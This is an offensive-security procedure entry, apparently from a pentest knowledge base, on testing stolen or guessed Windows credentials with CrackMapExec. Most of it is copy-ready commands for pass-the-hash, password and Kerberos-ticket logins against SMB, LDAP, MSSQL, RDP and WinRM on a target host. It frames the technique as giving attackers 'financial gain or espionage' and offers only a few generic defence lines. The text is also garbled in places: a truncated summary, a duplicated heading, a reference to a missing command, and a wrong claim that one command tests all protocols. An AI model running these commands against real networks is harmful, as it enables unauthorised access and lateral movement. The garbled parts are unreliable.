---
id: 49100454-f45c-4427-b865-7d85dc6cb042
name: SMB Credential Testing with Crackmapexec
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:30.735392+00:00'
updated_at: '2023-04-10T20:38:03.810653+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Brute Force|T1110 - Brute Force]]'
- '[[Credential Dumping|T1003 - Credential Dumping]]'
tags:
- '[[Crackmapexec]]'
- '[[Windows - Using credentials]]'
commands:
- '[[crackmapexec ldap]]'
- '[[crackmapexec mssql]]'
- '[[crackmapexec rdp]]'
- '[[crackmapexec smb]]'
- '[[crackmapexec smb with Kerberos]]'
- '[[crackmapexec smb with NT hash]]'
- '[[crackmapexec smb with password]]'
- '[[crackmapexec winrm]]'
---

# SMB Credential Testing with Crackmapexec

## Summary

SMB Credential Testing with Crackmapexec is a technique used by attackers to test the validity of stolen or guessed credentials against SMB services. Crackmapexec is a tool that automates the process of testing credentials against SMB services. This technique can be used to gain access to sensitive

## Description

# Description

SMB Credential Testing with Crackmapexec is a technique used by attackers to test the validity of stolen or guessed credentials against SMB services. Crackmapexec is a tool that automates the process of testing credentials against SMB services. This technique can be used to gain access to sensitive data or systems on a target network.

To use this technique, an attacker would first obtain credentials through various means such as phishing or password spraying. The attacker would then use Crackmapexec to test the credentials against SMB services on the target network. If the credentials are valid, the attacker can use them to gain access to sensitive data or systems on the target network.

The business value of this technique is that it allows attackers to gain access to sensitive data or systems on a target network, which can be used for financial gain or espionage.

 

## Requirements

1. Valid credentials for SMB services on the target network

1. Access to the target network

 

## Defense

1. Implement strong password policies and two-factor authentication to make it harder to obtain valid credentials

1. Monitor network traffic for signs of credential testing or brute force attacks

1. Limit access to sensitive data or systems to only authorized personnel

 

## Objectives

1. Test the validity of stolen or guessed credentials against SMB services on a target network

1. Gain access to sensitive data or systems on a target network

 

# Instructions

1. Run the above command in a terminal to test the given credentials for multiple protocols on the target machine.

 



**Code**: [[crackmapexec ldap 192.168.1.100 -u Administrator -]]



> This command uses CrackMapExec to test the given credentials for multiple protocols on the target machine. The protocols tested include LDAP, MSSQL, RDP, SMB, and WinRM. The command takes in the IP address of the target machine, the username (-u) and the password hash (-H) of the user account to be tested. If the credentials are valid, the command will return information about the target machine, including its hostname, domain, and operating system. This command is useful for testing the strength of credentials and identifying potential attack vectors.



**Command** ([[crackmapexec ldap]]):

```bash
crackmapexec ldap 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
```





**Command** ([[crackmapexec mssql]]):

```bash
crackmapexec mssql 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
```





**Command** ([[crackmapexec rdp]]):

```bash
crackmapexec rdp 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
```





**Command** ([[crackmapexec smb]]):

```bash
crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
```





**Command** ([[crackmapexec winrm]]):

```bash
crackmapexec winrm 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
```



2. To use CrackMapExec for SMB authentication, you can either provide a password, NT hash, or use Kerberos authentication. To provide a password, use the -p flag followed by the password in quotes. To provide an NT hash, use the -H flag followed by the hash. To use Kerberos authentication, export the KRB5CCNAME variable to the path of the Kerberos cache file and use the --use-kcache flag.

 



**Code**: [[crackmapexec smb 192.168.1.100 -u Administrator -p]]



> The CrackMapExec tool is used for penetration testing and allows for authentication using different methods. The SMB protocol is used for file sharing and other types of resource sharing between computers on a network. By using CrackMapExec with SMB authentication, the penetration tester can attempt to gain access to a target system by providing a valid password, NT hash, or using Kerberos authentication. The -u flag is used to specify the username to be used for authentication.



**Command** ([[crackmapexec smb with password]]):

```bash
crackmapexec smb 192.168.1.100 -u Administrator -p "Password123?"
```





**Command** ([[crackmapexec smb with NT hash]]):

```bash
crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
```





**Command** ([[crackmapexec smb with Kerberos]]):

```bash
export KRB5CCNAME=/tmp/kerberos/admin.ccache; crackmapexec smb 192.168.1.100 -u admin --use-kcache
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Brute Force|T1110 - Brute Force]]
- [[Credential Dumping|T1003 - Credential Dumping]]

## Commands Used

- [[crackmapexec ldap]]
- [[crackmapexec mssql]]
- [[crackmapexec rdp]]
- [[crackmapexec smb]]
- [[crackmapexec smb with Kerberos]]
- [[crackmapexec smb with NT hash]]
- [[crackmapexec smb with password]]
- [[crackmapexec winrm]]

## Tags

- [[Crackmapexec]]
- [[Windows - Using credentials]]


